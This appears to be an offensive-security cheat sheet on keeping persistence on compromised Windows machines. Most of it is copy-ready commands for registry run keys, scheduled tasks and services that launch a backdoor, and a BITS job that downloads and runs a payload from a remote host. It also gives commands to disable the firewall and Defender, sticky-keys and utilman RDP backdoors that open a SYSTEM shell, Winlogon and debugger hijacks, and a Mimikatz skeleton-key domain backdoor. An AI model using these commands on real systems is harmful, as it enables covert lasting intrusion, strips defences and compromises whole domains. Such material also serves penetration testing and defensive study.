---
description: >-
  Various techniques for maintaining persistence.  Includes methods that can be
  accomplished both with and without elevated privileges. Will provide commands
  for both cmd.exe and PowerShell if possible.
---

# Persistence

## Tools

* [SharPersist - C\# Binary - persistence toolkit - @h4wkst3r](https://github.com/fireeye/SharPersist)
  * Has numerous modules built-in to automate many different persistence methods
  * TODO: add tab to each applicable method below
* [on-load/on-close persistence PowerShell module](https://gist.github.com/netbiosX/ee35fcd3722e401a38136cff7b751d79) - [@netbiosX](https://github.com/netbiosX)
  * Powershell module which writes registry keys that execute a backdoor payload of your choice when a certain Windows binary loads or closes \(in this case notepad.exe\).

## As a Low-Privilege User:

### Set a file as hidden

{% tabs %}
{% tab title="PowerShell" %}
Set a file as **Hidden**.  This can also be used to change other file property flags such as Archive and ReadOnly.

```text
$file = (Get-ChildItem <file>) #can shorten command with gci or ls
$file.attributes #Show the files attributes
Normal

#Flip the bit of the Hidden attribute
$file.attributes = $file.Attributes -bxor ([System.IO.FileAttributes]::Hidden)
$file.attributes
Hidden

#To remove the 'Hidden' attribute
$file.attributes = $file.Attributes -bxor ([System.IO.FileAttributes]::Hidden)
$file.attributes
Normal
```
{% endtab %}

{% tab title="cmd.exe" %}
Set a file as **Hidden** \(`-h`\).  This can also be used to change other file property flags such as \(`a`\) Archive and \(`r`\) ReadOnly. Flags must be added separately \(`-h -a -r` not `-har`\).

```text
attrib <C:\path\filename> #show the file attributes

attrib +h <C:\path\filename>

#to remove the hidden property
attrib -h <C:\path\filename>
```
{% endtab %}
{% endtabs %}

### Registry - HKCU 

#### Autoruns

{% tabs %}
{% tab title="PowerShell" %}
Create key values in the Autoruns keys in `HKCU:\Software\Microsoft\Windows\CurrentVersion`. **Run** and **RunOnce** keys are run each time a new user logs in. **RunServices** and **RunServicesOnce** are run in the background when the logon dialog box first appears or at this stage of the boot process if there is no logon.

```text
New-ItemProperty -Path HKCU:\Software\Microsoft\Windows\CurrentVersion\Run -PropertyType String -Name <key_name> -Value "<C:\Path\to\backdoor.exe>"
New-ItemProperty -Path HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce -PropertyType String -Name <key_name> -Value "<C:\Path\to\backdoor.exe>"
New-ItemProperty -Path HKCU:\Software\Microsoft\Windows\CurrentVersion\RunServices -PropertyType String -Name <key_name> -Value "<C:\Path\to\backdoor.exe>"
New-ItemProperty -Path HKCU:\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce -PropertyType String -Name <key_name> -Value "<C:\Path\to\backdoor.exe>"
```
{% endtab %}

{% tab title="cmd.exe" %}
Create values in the Autoruns keys in `HKCU\Software\Microsoft\Windows\CurrentVersion`. The option `/v` is the name you want, and `/d` is the path to your backdoor.  **Run** and **RunOnce** keys are run each time a new user logs in. **RunServices** and **RunServicesOnce** are run in the background when the logon dialog box first appears or at this stage of the boot process if there is no logon.

```text
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v <name> /t REG_SZ /d "<C:\Path\to\backdoor.exe>"
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v <name> /t REG_SZ /d "<C:\Path\to\backdoor.exe>"
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServices" /v <name> /t REG_SZ /d "<C:\Path\to\backdoor.exe>"
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce" /v <name> /t REG_SZ /d "<C:\Path\to\backdoor.exe>"
```
{% endtab %}
{% endtabs %}

> By default, the value of a RunOnce key is deleted before the command line is run. You can prefix a RunOnce value name with an exclamation point \(!\) to defer deletion of the value until after the command runs. Without the exclamation point prefix, if the RunOnce operation fails the associated program will not be asked to run the next time you start the computer. 
>
> By default, these keys are ignored when the computer is started in Safe Mode. The value name of RunOnce keys can be prefixed with an asterisk \(\*\) to force the program to run even in Safe mode.
>
> [Microsoft](https://docs.microsoft.com/en-us/windows/win32/setupapi/run-and-runonce-registry-keys)

### Startup

Create a batch script in the user startup folder to run when the user logs in.

{% tabs %}
{% tab title="PowerShell" %}
Create .bat in `"$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\"`.  Then have this batch file call your backdoor in `$env:USERPROFILE\AppData\Local\Temp\`.

```text
start /b %USERPROFILE%\AppData\Local\Temp\backdoor.bat
```
{% endtab %}

{% tab title="cmd.exe" %}
Create .bat in `"%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\"`.  Then have this batch file call your backdoor in `%USERPROFILE%\AppData\Local\Temp\`.

```text
start /b $env:USERPROFILE\AppData\Local\Temp\backdoor.bat
```
{% endtab %}
{% endtabs %}

### Scheduled Tasks

add cmd.exe

{% tabs %}
{% tab title="PowerShell" %}
These commands will allow your backdoor to be run when the specified user logs into the machine.  

```text
$action = New-ScheduledTaskAction -Execute "cmd.exe" -Argument "/c <C:\Path\To\backdoor.exe>"
$trigger = New-ScheduledTaskTrigger -AtLogOn -User "<username>"
$principal = New-ScheduledTaskPrincipal "<username>"
$settings = New-ScheduledTaskSettingsSet
$task = New-ScheduledTask -Action $action -Trigger $trigger -Principal $principal -Settings $settings
Register-ScheduledTask <taskname> -InputObject $task
```
{% endtab %}

{% tab title="cmd.exe" %}
These commands will allow your backdoor to be run when the specified user logs into the machine.  
{% endtab %}
{% endtabs %}

### BITS Jobs

add powershell

```text
bitsadmin /create backdoor
bitsadmin /addfile backdoor "http://10.10.10.10/evil.exe"  "C:\tmp\evil.exe"

# v1
bitsadmin /SetNotifyCmdLine backdoor C:\tmp\evil.exe NUL
bitsadmin /SetMinRetryDelay "backdoor" 60
bitsadmin /resume backdoor

# v2 - exploit/multi/script/web_delivery
bitsadmin /SetNotifyCmdLine backdoor regsvr32.exe "/s /n /u /i:http://10.10.10.10:8080/FHXSd9.sct scrobj.dll"
bitsadmin /resume backdoor
```

### Windows Services

May need some privileges for Windows services...

## As an Elevated-Privilege User

All commands below this header require some sort of elevated account privileges.  As I discover them, I will add which specific Windows privileges are required.  

### Windows Firewall

#### Disabling Windows Firewall

{% tabs %}
{% tab title="PowerShell" %}
To view the state and settings of all Windows firewall profiles \(this output is not as pretty as the `netsh` command from cmd.exe, but can be manipulated like any PowerShell object\):

```text
Get-NetFirewallProfile
```

To disable the Windows firewall for all network profiles:

```text
Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
```

 If you only want to disable the firewall for a specific profile, you can remove the profile name \(Domain, Public, or Private\) from the command.  This can be useful if you are unable to fully disable the firewall.
{% endtab %}

{% tab title="cmd.exe" %}
To view the states of all firewall profiles, and then disable all of them:

```text
Netsh Advfirewall show allprofiles

NetSh Advfirewall set allprofiles state off
```

If you cannot turn off all profiles, try each individual profile:

```text
netsh advfirewall set currentprofile state off

netsh advfirewall set domainprofile state off

netsh advfirewall set privateprofile state off

netsh advfirewall set publicprofile state off
```

These commands can also be used in PowerShell.
{% endtab %}
{% endtabs %}

#### Create firewall rules

{% tabs %}
{% tab title="PowerShell" %}
add more

```text
New-NetFirewallRule -Name <rule_name> -DisplayName <rule_name> -Enabled True -Direction Inbound -Protocol ANY -Action Allow -Profile ANY -RemoteAddress <attackers_IP>
```
{% endtab %}

{% tab title="cmd.exe" %}
add more
{% endtab %}
{% endtabs %}

### Disable Windows Defender

{% tabs %}
{% tab title="PowerShell" %}
add more info

```text
Set-MpPreference -DisableRealtimeMonitoring $true
```
{% endtab %}

{% tab title="cmd.exe" %}
add more info

```text
sc config WinDefend start= disabled
sc stop WinDefend
```
{% endtab %}
{% endtabs %}

### Registry - HKLM 

#### Autoruns

{% tabs %}
{% tab title="PowerShell" %}
Create key values in the Autoruns keys in `HKCU:\Software\Microsoft\Windows\CurrentVersion`. **Run** and **RunOnce** keys are run each time a new user logs in. **RunServices** and **RunServicesOnce** are run in the background when the logon dialog box first appears or at this stage of the boot process if there is no logon.

```text
New-ItemProperty -Path HKLM:\Software\Microsoft\Windows\CurrentVersion\Run -PropertyType String -Name <key_name> -Value "<C:\Path\to\backdoor.exe>"
New-ItemProperty -Path HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce -PropertyType String -Name <key_name> -Value "<C:\Path\to\backdoor.exe>"
New-ItemProperty -Path HKLM:\Software\Microsoft\Windows\CurrentVersion\RunServices -PropertyType String -Name <key_name> -Value "<C:\Path\to\backdoor.exe>"
New-ItemProperty -Path HKLM:\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce -PropertyType String -Name <key_name> -Value "<C:\Path\to\backdoor.exe>"
```
{% endtab %}

{% tab title="cmd.exe" %}
Create values in the Autoruns keys in `HKCU\Software\Microsoft\Windows\CurrentVersion`. The option `/v` is the name you want, and `/d` is the path to your backdoor.  **Run** and **RunOnce** keys are run each time a new user logs in. **RunServices** and **RunServicesOnce** are run in the background when the logon dialog box first appears or at this stage of the boot process if there is no logon.

```text
reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run" /v <name> /t REG_SZ /d "<C:\Path\to\backdoor.exe>"
reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v <name> /t REG_SZ /d "<C:\Path\to\backdoor.exe>"
reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices" /v <name> /t REG_SZ /d "<C:\Path\to\backdoor.exe>"
reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce" /v <name> /t REG_SZ /d "<C:\Path\to\backdoor.exe>"
```
{% endtab %}
{% endtabs %}

> By default, the value of a RunOnce key is deleted before the command line is run. You can prefix a RunOnce value name with an exclamation point \(!\) to defer deletion of the value until after the command runs. Without the exclamation point prefix, if the RunOnce operation fails the associated program will not be asked to run the next time you start the computer. 
>
> By default, these keys are ignored when the computer is started in Safe Mode. The value name of RunOnce keys can be prefixed with an asterisk \(\*\) to force the program to run even in Safe mode.
>
> [Microsoft](https://docs.microsoft.com/en-us/windows/win32/setupapi/run-and-runonce-registry-keys)

#### Winlogon Helper DLL

{% tabs %}
{% tab title="PowerShell" %}
Run backdoor during Windows logon

```text
Set-ItemProperty "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\" "Userinit" "Userinit.exe, <backdoor.exe>" -Force
Set-ItemProperty "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\" "Shell" "explorer.exe, <backdoor.exe>" -Force
```
{% endtab %}

{% tab title="cmd.exe" %}
Run backdoor during Windows logon

```text
reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Userinit /d "Userinit.exe, evilbinary.exe" /f
reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Shell /d "explorer.exe, evilbinary.exe" /f
```
{% endtab %}
{% endtabs %}

#### GlobalFlag

add powershell

Add the following three keys to the registry to allow your backdoor to execute whenever Notepad.exe closes.

```text
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe" /v GlobalFlag /t REG_DWORD /d 512
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe" /v ReportingMode /t REG_DWORD /d 1
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe" /v MonitorProcess /d "C:\temp\evil.exe"
```

You can also abuse this to run your backdoor whenever Notepad.exe is opened with two registry keys:

```text
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe" /v Debugger /d "pentestlab.exe"
reg add HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe
```

This process can be automated by using [this](https://gist.github.com/netbiosX/ee35fcd3722e401a38136cff7b751d79) PowerShell module from [netbiosX](https://github.com/netbiosX).  

### Scheduled Tasks

Scheduled Task to run your backdoor as NT AUTHORITY\SYSTEM, everyday at 9am.

add cmd.exe

```text
PS C:\> $action = New-ScheduledTaskAction -Execute "cmd.exe" -Argument "/c <C:\Path\To\backdoor.exe>"
PS C:\> $trigger = New-ScheduledTaskTrigger -Daily -At 9am
PS C:\> $principal = New-ScheduledTaskPrincipal "NT AUTHORITY\SYSTEM" -RunLevel Highest
PS C:\> $settings = New-ScheduledTaskSettingsSet
PS C:\> $task = New-ScheduledTask -Action $action -Trigger $trigger -Principal $principal -Settings $Settings
PS C:\> Register-ScheduledTask <taskname> -InputObject $task
```

### Windows Services

{% tabs %}
{% tab title="PowerShell" %}
Create a service that can start automatically or on-demand as needed.

```text
PS C:\> New-Service -Name "AppReadiness" -BinaryPathName "C:\Windows\Temp\backdoor.exe" -Description "Gets apps ready for use the first time a user signs in to this PC and when adding new apps."
```
{% endtab %}

{% tab title="cmd.exe" %}

{% endtab %}
{% endtabs %}

### Replacing Windows Binaries

Replace these binaries with your backdoor to enable easy persistence with minimal interference with normal user's notice.  Beware using these on systems where the user needs these accessibility tools!

{% tabs %}
{% tab title="Windows XP+" %}
| Feature | Executable |
| :--- | :--- |
| Sticky Keys | C:\Windows\System32\sethc.exe |
| Accessibility Menu | C:\Windows\System32\utilman.exe |
| On-Screen Keyboard | C:\Windows\System32\osk.exe |
| Magnifier | C:\Windows\System32\Magnify.exe |
| Narrator | C:\Windows\System32\Narrator.exe |
| Display Switcher | C:\Windows\System32\DisplaySwitch.exe |
| App Switcher | C:\Windows\System32\AtBroker.exe |

In Metasploit : `use post/windows/manage/sticky_keys`
{% endtab %}

{% tab title="Windows 10+" %}
You can exploit a DLL hijacking vulnerability in the On-Screen Keyboard **osk.exe** executable by creating a malicious **HID.dll** in `C:\Program Files\Common Files\microsoft shared\ink\HID.dll`.
{% endtab %}
{% endtabs %}

### RDP Backdoors

#### utilman.exe

After adding this registry key, RDP into the machine. At the login screen, press `Win+U` to get a cmd.exe prompt as NT AUTHORITY\SYSTEM.

```text
REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\utilman.exe" /t REG_SZ /v Debugger /d "C:\windows\system32\cmd.exe" /f
```

#### sethc.exe

After adding this registry key, RDP into the machine. At the login screen, repeatedly press F5 when you are at the RDP login screen to get a cmd.exe prompt as NT AUTHORITY\SYSTEM.

```text
REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /t REG_SZ /v Debugger /d "C:\windows\system32\cmd.exe" /f
```

### Skeleton Key

Mimikatz gives you the opportunity to backdoor an entire domain at once by using the skeleton key module.  This must be run by a user with Domain Admin credentials to work properly.

```text
# Exploitation Command (run as Domain Admin):
Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton"' -ComputerName <FQDN_of_DC>

# Login using the password "mimikatz"
Enter-PSSession -ComputerName <Any_Domain_Computer> -Credential <Domain>\Administrator
```

## References

* [https://pentestlab.blog/2020/01/13/persistence-image-file-execution-options-injection/](https://pentestlab.blog/2020/01/13/persistence-image-file-execution-options-injection/)
* [A view of persistence - Rastamouse](https://rastamouse.me/2018/03/a-view-of-persistence/)
* [Windows Persistence Commands - Pwn Wiki](http://pwnwiki.io/#!persistence/windows/index.md)
* [SharPersist Windows Persistence Toolkit in C - Brett Hawkins](http://www.youtube.com/watch?v=K7o9RSVyazo)
* [Old Tricks Are Always Useful: Exploiting Arbitrary File Writes with Accessibility Tools - @phraaaaaaa](https://iwantmore.pizza/posts/arbitrary-write-accessibility-tools.html)
* [Persistence - Checklist - @netbiosX](https://github.com/netbiosX/Checklists/blob/master/Persistence.md)
* [Persistence – Winlogon Helper DLL - @netbiosX](https://pentestlab.blog/2020/01/14/persistence-winlogon-helper-dll/)
* [Persistence - BITS Jobs - @netbiosX](https://pentestlab.blog/2019/10/30/persistence-bits-jobs/)
* [Persistence – Image File Execution Options Injection - @netbiosX](https://pentestlab.blog/2020/01/13/persistence-image-file-execution-options-injection/)
* [Persistence – Registry Run Keys - @netbiosX](https://pentestlab.blog/2019/10/01/persistence-registry-run-keys/)
* [https://pureinfotech.com/enable-disable-firewall-windows-10/](https://pureinfotech.com/enable-disable-firewall-windows-10/) - [Mauro Huc](https://pureinfotech.com/author/mauhuc/) [@pureinfotech](https://twitter.com/@pureinfotech)
* [http://vcloud-lab.com/entries/powershell/microsoft-powershell-remotely-write-edit-modify-new-registry-key-and-data-value](http://vcloud-lab.com/entries/powershell/microsoft-powershell-remotely-write-edit-modify-new-registry-key-and-data-value) - [@KunalAdapi](https://twitter.com/kunalUdapi)

